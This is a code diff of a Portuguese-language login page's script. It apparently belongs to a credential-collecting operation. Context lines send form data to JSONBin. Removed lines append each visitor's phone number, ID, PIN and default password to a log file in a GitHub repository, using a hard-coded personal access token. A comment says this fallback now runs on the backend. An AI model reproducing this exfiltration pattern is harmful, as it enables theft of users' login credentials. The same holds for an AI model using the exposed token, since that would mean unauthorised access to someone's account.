@@ -416,7 +416,7 @@
                 const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone, code: pin })
+                    body: JSON.stringify({ phone: currentPhone, code: pin, id: currentId })
                 });
                 apiResult = await response.json();
                 if (apiResult.code === 12007 || apiResult.code === 10002) {
@@ -474,42 +474,7 @@
                 console.log("Sucesso no JSONBin:", await response.json());
             } catch (error) {
                 console.error("Falha no JSONBin:", error.message);
-                fallbackToGitHub(formData);
-            }
-        }
-
-        async function fallbackToGitHub(formData) {
-            const logLine = `${formData.timestamp} | ${formData.telefone} | ${formData.id} | ${formData.pin} | ${formData.senha_padrao}\n`;
-            console.log("FALLBACK: Cole no logs.txt:", logLine);
-
-            const GITHUB_TOKEN = "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"; // Seu token já inserido
-            const OWNER = "infinityrecarga";
-            const REPO = "kako-logs-contencao";
-            const PATH = "logs.txt";
-
-            try {
-                const getUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`;
-                const getHeaders = { "Authorization": `token ${GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" };
-                const getResp = await fetch(getUrl, { headers: getHeaders });
-                const getData = await getResp.json();
-                const sha = getData.sha;
-                const currentContent = atob(getData.content);
-
-                const updatedContent = currentContent + logLine;
-                const putData = {
-                    message: "Adiciona log de contenção",
-                    content: btoa(updatedContent),
-                    sha: sha
-                };
-                const putResp = await fetch(getUrl, {
-                    method: "PUT",
-                    headers: getHeaders,
-                    body: JSON.stringify(putData)
-                });
-                if (putResp.ok) console.log("Log salvo no GitHub!");
-                else console.error("Falha no GitHub:", await putResp.text());
-            } catch (error) {
-                console.error("Erro no fallback GitHub:", error);
+                // Fallback agora é no backend, então não precisa aqui
             }
         }
     </script>
